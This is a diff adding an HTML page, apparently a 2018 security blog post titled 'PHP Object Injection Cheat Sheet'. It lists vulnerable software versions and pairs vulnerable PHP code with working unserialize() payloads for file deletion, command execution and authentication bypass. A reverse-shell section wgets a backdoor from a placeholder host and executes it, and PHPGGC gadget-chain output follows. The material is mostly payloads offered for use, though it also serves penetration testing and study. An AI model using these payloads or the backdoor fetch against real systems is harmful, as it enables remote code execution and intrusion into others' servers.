@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.css" />
+<script async defer src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.js"></script>
+<script>
+window.addEventListener("load", function(){
+window.cookieconsent.initialise({
+  "palette": {
+    "popup": {
+      "background": "#424242"
+    },
+    "button": {
+      "background": "#2a7ae2"
+    }
+  },
+  "content": {
+    "href": "/privacy-policy"
+  }
+})});
+</script>
+  
+  
+  
+  <title>PHP Object Injection Cheat Sheet</title>
+  <meta name="description" content="">
+  
+    
+    <meta name="keywords" content="Lucian Nitescu offensive security cheat sheet reverse shell backdoor bash perl python PHP">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="https://nitesculucian.github.io/feed.xml">
+  <meta name="flattr:id" content="njnwdo">
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:title" content="PHP Object Injection Cheat Sheet">
+  <meta name="twitter:description" content="">
+  
+  
+
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700" rel="stylesheet">
+
+  
+  <!-- Google Analytics -->
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-107695141-1', 'auto');
+    ga('send', 'pageview');
+
+  </script>
+
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Lucian Nitescu</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/">Home</a>
+      
+        
+        <a class="page-link" href="/about/">Whoami</a>
+      
+        
+        <a class="page-link" href="/archives/">Archives</a>
+      
+    </nav>
+    <br>Security Blog
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">PHP Object Injection Cheat Sheet</h1>
+    
+    <p class="post-meta"><time datetime="2018-10-05T18:40:00-03:00" itemprop="datePublished">Oct 5, 2018</time> •
+  
+    
+    
+      
+    
+      
+    
+      
+        <a href="/categories/cheatsheet/">cheatsheet</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/offensive-security/">offensive_security</a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+
+
+
+</p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p><img src="/uploads/Screenshot%20from%202018-10-06%2000-59-06.png" alt="Image of PHP Object Injection" /></p>
+
+<h2 id="description-of-the-vulnerability">Description of the vulnerability</h2>
+
+<p>PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context.</p>
+
+<p>The vulnerability occurs when <strong>user-supplied input is not properly sanitized</strong>  before being passed to the <strong>unserialize() PHP function</strong>.</p>
+
+<p>In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:</p>
+
+<ul>
+  <li>The application must have a class which implements a <strong>PHP magic method</strong> (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a “POP chain”.</li>
+  <li>All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.</li>
+</ul>
+
+<p><strong>Example:</strong></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// some PHP code including PHP magic method ...</span>
+
+<span class="nv">$user_data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]);</span>
+
+<span class="c1">// some PHP code...</span>
+</code></pre></div></div>
+
+<h2 id="known-vulnerable-software">Known Vulnerable Software</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Software</th>
+      <th>Version</th>
+      <th>Reference</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>WordPress</td>
+      <td>3.6.1</td>
+      <td>https://nvd.nist.gov/vuln/detail/CVE-2013-4338</td>
+    </tr>
+    <tr>
+      <td>Magento</td>
+      <td>1.9.0.1</td>
+      <td>https://magento.com/security/patches/supee-10415</td>
+    </tr>
+    <tr>
+      <td>Joomla</td>
+      <td>3.0.3</td>
+      <td>https://packetstormsecurity.com/files/121442/Joomla-3.0.3-PHP-Object-Injection.html</td>
+    </tr>
+    <tr>
+      <td>IP Board</td>
+      <td>3.3.4</td>
+      <td>https://www.exploit-db.com/exploits/22398/</td>
+    </tr>
+    <tr>
+      <td>Dotclear</td>
+      <td>2.6.1</td>
+      <td>https://www.cvedetails.com/cve/CVE-2014-1613/</td>
+    </tr>
+    <tr>
+      <td>OpenCart</td>
+      <td>1.5.6.4</td>
+      <td>http://karmainsecurity.com/KIS-2014-08</td>
+    </tr>
+    <tr>
+      <td>CubeCart</td>
+      <td>5.2.0</td>
+      <td>http://karmainsecurity.com/KIS-2013-02</td>
+    </tr>
+    <tr>
+      <td>Drupal</td>
+      <td>7.34</td>
+      <td>https://websec.wordpress.com/2015/01/09/drupal-7-34-admin-php-object-injection/</td>
+    </tr>
+    <tr>
+      <td>vBulletin</td>
+      <td>5.1.0</td>
+      <td>https://blog.sucuri.net/2014/03/security-exploit-patched-on-vbulletin-php-object-injection.html</td>
+    </tr>
+    <tr>
+      <td>Tuelap</td>
+      <td>7.6-4</td>
+      <td>http://karmainsecurity.com/KIS-2014-13</td>
+    </tr>
+    <tr>
+      <td>Moodle</td>
+      <td>2.5.0</td>
+      <td>http://disse.cting.org/2013/09/16/2013-09-16-moodle-2-5-0-1-badges-external-object-injection</td>
+    </tr>
+    <tr>
+      <td>WHMCS</td>
+      <td>5.2.12</td>
+      <td>http://security-geeks.blogspot.com/2013/11/whmcs-5112-php-object-injectoin.html</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="php-magic-methods">PHP Magic Methods</h2>
+
+<table>
+  <tbody>
+    <tr>
+      <td>__construct()</td>
+      <td>__set()</td>
+      <td>__toString()</td>
+    </tr>
+    <tr>
+      <td>__destruct()</td>
+      <td>__isset()</td>
+      <td>__invoke()</td>
+    </tr>
+    <tr>
+      <td>__call()</td>
+      <td>__unset()</td>
+      <td>__set_state()</td>
+    </tr>
+    <tr>
+      <td>__callStatic()</td>
+      <td>__sleep()</td>
+      <td>__clone()</td>
+    </tr>
+    <tr>
+      <td>__get()</td>
+      <td>__wakeup()</td>
+      <td>__debugInfo()</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="examples-of-php-object-injection">Examples of PHP Object Injection</h2>
+
+<h3 id="exploit-with-the-__destruct-method">Exploit with the __destruct method</h3>
+
+<p>Vulnerable code:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Example1</span>
+<span class="p">{</span>
+   <span class="k">public</span> <span class="nv">$cache_file</span><span class="p">;</span>
+
+   <span class="k">function</span> <span class="nf">__construct</span><span class="p">()</span>
+   <span class="p">{</span>
+      <span class="c1">// some PHP code...</span>
+   <span class="p">}</span>
+
+   <span class="k">function</span> <span class="nf">__destruct</span><span class="p">()</span>
+   <span class="p">{</span>
+      <span class="nv">$file</span> <span class="o">=</span> <span class="s2">"/var/www/cache/tmp/</span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_file</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+   <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// some PHP code...</span>
+
+<span class="nv">$user_data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]);</span>
+
+<span class="c1">// some PHP code..</span>
+</code></pre></div></div>
+
+<p>Payload:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}
+</span></code></pre></div></div>
+
+<h3 id="exploit-with-the-__wakeup-in-the-unserialize-function">Exploit with the __wakeup in the unserialize function</h3>
+
+<p>Vulnerable code:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+    <span class="k">class</span> <span class="nc">PHPObjectInjection</span><span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$inject</span><span class="p">;</span>
+        <span class="k">function</span> <span class="nf">__construct</span><span class="p">(){</span>
+        <span class="p">}</span>
+        <span class="k">function</span> <span class="nf">__wakeup</span><span class="p">(){</span>
+            <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">inject</span><span class="p">)){</span>
+                <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">inject</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'r'</span><span class="p">])){</span>  
+        <span class="nv">$var1</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'r'</span><span class="p">]);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$var1</span><span class="p">)){</span>
+            <span class="k">echo</span> <span class="s2">"&lt;br/&gt;"</span><span class="o">.</span><span class="nv">$var1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">" - "</span><span class="o">.</span><span class="nv">$var1</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span><span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">""</span><span class="p">;</span> <span class="c1"># nothing happens here</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Payload:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Basic serialized data</span>
+<span class="nx">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"XVWA"</span><span class="p">;</span><span class="nx">i</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="s2">"Xtreme Vulnerable Web Application"</span><span class="p">;}</span>
+
+<span class="c1"># Command execution</span>
+<span class="nx">string</span><span class="p">(</span><span class="mi">68</span><span class="p">)</span> <span class="s2">"O:18:"</span><span class="nx">PHPObjectInjection</span><span class="s2">":1:</span><span class="si">{</span><span class="nv">s:6:"inject";s:17:"system('whoami');";</span><span class="si">}</span><span class="s2">"</span>
+</code></pre></div></div>
+
+<h3 id="authentication-bypass---type-juggling">Authentication bypass - Type juggling</h3>
+
+<p>Vulnerable code:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'auth'</span><span class="p">]);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$adminName</span> <span class="o">&amp;&amp;</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$adminPassword</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$admin</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$admin</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Payload:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"username"</span><span class="p">;</span><span class="nx">b</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"password"</span><span class="p">;</span><span class="nx">b</span><span class="o">:</span><span class="mi">1</span><span class="p">;}</span>
+</code></pre></div></div>
+
+<h3 id="authentication-bypass---object-reference">Authentication bypass - Object reference</h3>
+
+<p>Vulnerable code:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">Object</span>
+<span class="p">{</span>
+  <span class="k">var</span> <span class="nv">$guess</span><span class="p">;</span>
+  <span class="k">var</span> <span class="nv">$secretCode</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$obj</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'input'</span><span class="p">]);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$obj</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">secretCode</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">500000</span><span class="p">,</span><span class="mi">999999</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">guess</span> <span class="o">===</span> <span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">secretCode</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"Win"</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Payload:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">O</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">"Object"</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">"secretCode"</span><span class="p">;</span><span class="nx">N</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"code"</span><span class="p">;</span><span class="nx">R</span><span class="o">:</span><span class="mi">2</span><span class="p">;}</span>
+</code></pre></div></div>
+
+<h3 id="authentication-bypass---object-reference-1">Authentication bypass - Object reference</h3>
+
+<p>Vulnerable code:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Example3</span>
+<span class="p">{</span>
+   <span class="k">protected</span> <span class="nv">$obj</span><span class="p">;</span>
+
+   <span class="k">function</span> <span class="nf">__construct</span><span class="p">()</span>
+   <span class="p">{</span>
+      <span class="c1">// some PHP code...</span>
+   <span class="p">}</span>
+
+   <span class="k">function</span> <span class="nf">__toString</span><span class="p">()</span>
+   <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">obj</span><span class="p">))</span> <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">obj</span><span class="o">-&gt;</span><span class="na">getValue</span><span class="p">();</span>
+   <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// some PHP code...</span>
+
+<span class="nv">$user_data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]);</span>
+
+<span class="c1">// some PHP code..</span>
+</code></pre></div></div>
+<p>Payload:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">SQL_Row_Value</span>
+<span class="p">{</span>
+   <span class="k">private</span> <span class="nv">$_table</span> <span class="o">=</span> <span class="s2">"SQL Injection"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">Example3</span>
+<span class="p">{</span>
+   <span class="k">protected</span> <span class="nv">$obj</span><span class="p">;</span>
+
+   <span class="k">function</span> <span class="nf">__construct</span><span class="p">()</span>
+   <span class="p">{</span>
+      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SQL_Row_Value</span><span class="p">;</span>
+   <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">print</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Example3</span><span class="p">));</span>
+</code></pre></div></div>
+
+<h2 id="others-exploits">Others exploits</h2>
+
+<h4 id="reverse-shell">Reverse Shell</h4>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">PHPObjectInjection</span>
+<span class="p">{</span>
+    <span class="c1">// CHANGE URL/FILENAME TO MATCH YOUR SETUP</span>
+    <span class="k">public</span> <span class="nv">$inject</span> <span class="o">=</span> <span class="s2">"system('wget http://URL/backdoor.txt -O phpobjbackdoor.php &amp;&amp; php phpobjbackdoor.php');"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">PHPObjectInjection</span><span class="p">));</span>
+</code></pre></div></div>
+
+<h2 id="finding-and-using-gadgets-phpggc">Finding and using gadgets (PHPGGC)</h2>
+
+<p>PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically. When encountering an unserialize on a website you don’t have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them.</p>
+
+<p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./phpggc <span class="nt">-l</span>
+
+Gadget Chains
+<span class="nt">-------------</span>
+
+NAME                  VERSION           TYPE             VECTOR         I    
+Doctrine/FW1          ?                 file_write       __toString     <span class="k">*</span>    
+Guzzle/FW1            6.0.0 &lt;<span class="o">=</span> 6.3.2    file_write       __destruct          
+Guzzle/RCE1           6.0.0 &lt;<span class="o">=</span> 6.3.2    rce              __destruct          
+Laravel/RCE1          5.4.27            rce              __destruct          
+Laravel/RCE2          5.5.39            rce              __destruct          
+Laravel/RCE3          5.5.39            rce              __destruct     <span class="k">*</span>    
+Laravel/RCE4          5.5.39            rce              __destruct          
+Magento/SQLI1         ? &lt;<span class="o">=</span> 1.9.3.4      sql_injection    __destruct          
+Monolog/RCE1          1.18 &lt;<span class="o">=</span> 1.23      rce              __destruct          
+Monolog/RCE2          1.5 &lt;<span class="o">=</span> 1.17       rce              __destruct          
+Phalcon/RCE1          &lt;<span class="o">=</span> 1.2.2          rce              __wakeup       <span class="k">*</span>    
+Slim/RCE1             3.8.1             rce              __toString          
+SwiftMailer/FW1       5.1.0 &lt;<span class="o">=</span> 5.4.8    file_write       __toString          
+SwiftMailer/FW2       6.0.0 &lt;<span class="o">=</span> 6.0.1    file_write       __toString          
+SwiftMailer/FW3       5.0.1             file_write       __toString          
+Symfony/FW1           2.5.2             file_write       DebugImport    <span class="k">*</span>    
+Symfony/RCE1          3.3               rce              __destruct     <span class="k">*</span>    
+Symfony/RCE2          2.3.42 &lt; 2.6      rce              __destruct     <span class="k">*</span>    
+Symfony/RCE3          2.6 &lt;<span class="o">=</span> 2.8.32     rce              __destruct     <span class="k">*</span>    
+Yii/RCE1              1.1.19            rce              __destruct          
+ZendFramework/RCE1    ? &lt;<span class="o">=</span> 1.12.20      rce              __destruct     <span class="k">*</span> 
+</code></pre></div></div>
+
+<p>Example:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./phpggc monolog/rce1 <span class="s1">'phpinfo();'</span>
+O:32:<span class="s2">"Monolog</span><span class="se">\H</span><span class="s2">andler</span><span class="se">\S</span><span class="s2">yslogUdpHandler"</span>:1:<span class="o">{</span>s:9:<span class="s2">"*socket"</span><span class="p">;</span>O:29:<span class="s2">"Monolog</span><span class="se">\H</span><span class="s2">andler</span><span class="se">\B</span><span class="s2">ufferHandler"</span>:7:<span class="o">{</span>s:10:<span class="s2">"*handler"</span><span class="p">;</span>r:2<span class="p">;</span>s:13:<span class="s2">"*bufferSize"</span><span class="p">;</span>i:-1<span class="p">;</span>s:9:<span class="s2">"*buffer"</span><span class="p">;</span>a:1:<span class="o">{</span>i:0<span class="p">;</span>a:2:<span class="o">{</span>i:0<span class="p">;</span>s:10:<span class="s2">"phpinfo();"</span><span class="p">;</span>s:5:<span class="s2">"level"</span><span class="p">;</span>N<span class="p">;</span><span class="o">}}</span>s:8:<span class="s2">"*level"</span><span class="p">;</span>N<span class="p">;</span>s:14:<span class="s2">"*initialized"</span><span class="p">;</span>b:1<span class="p">;</span>s:14:<span class="s2">"*bufferLimit"</span><span class="p">;</span>i:-1<span class="p">;</span>s:13:<span class="s2">"*processors"</span><span class="p">;</span>a:2:<span class="o">{</span>i:0<span class="p">;</span>s:7:<span class="s2">"current"</span><span class="p">;</span>i:1<span class="p">;</span>s:6:<span class="s2">"assert"</span><span class="p">;</span><span class="o">}}}</span>
+</code></pre></div></div>
+
+<h2 id="thanks-to">Thanks to</h2>
+
+<p>This article is composed of information found on the folowing links (+ plus some minor additions). I use this article to quick observe or demonstrate situations and as a personal reference all the infromation needed in exploiting the PHP Object Injection Vulnerability.</p>
+
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PHP%20serialization">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PHP%20serialization</a></p>
+
+<p><a href="https://securitycafe.ro/2015/01/05/understanding-php-object-injection/">https://securitycafe.ro/2015/01/05/understanding-php-object-injection/</a></p>
+
+<p><a href="https://www.owasp.org/index.php/PHP_Object_Injection">https://www.owasp.org/index.php/PHP_Object_Injection</a></p>
+
+<p><a href="http://location-href.com/php-object-injection/">http://location-href.com/php-object-injection/</a></p>
+
+<p><a href="https://www.ambionics.io/blog/php-generic-gadget-chains">https://www.ambionics.io/blog/php-generic-gadget-chains</a></p>
+
+<p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p>
+
+  </div>
+
+  
+    <div class="post-comments" itemprop="comment">
+      <hr />
+<h1>Comments</h1>
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://nitesculucian.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    </div>
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy; Lucian Nitescu - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://nitesculucian.github.io/feed.xml">RSS</a>
+
+      | <a href="/privacy-policy" >Privacy Policy</a>
+      | <a href="/legal-disclaimer" >Legal Disclaimer</a>
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
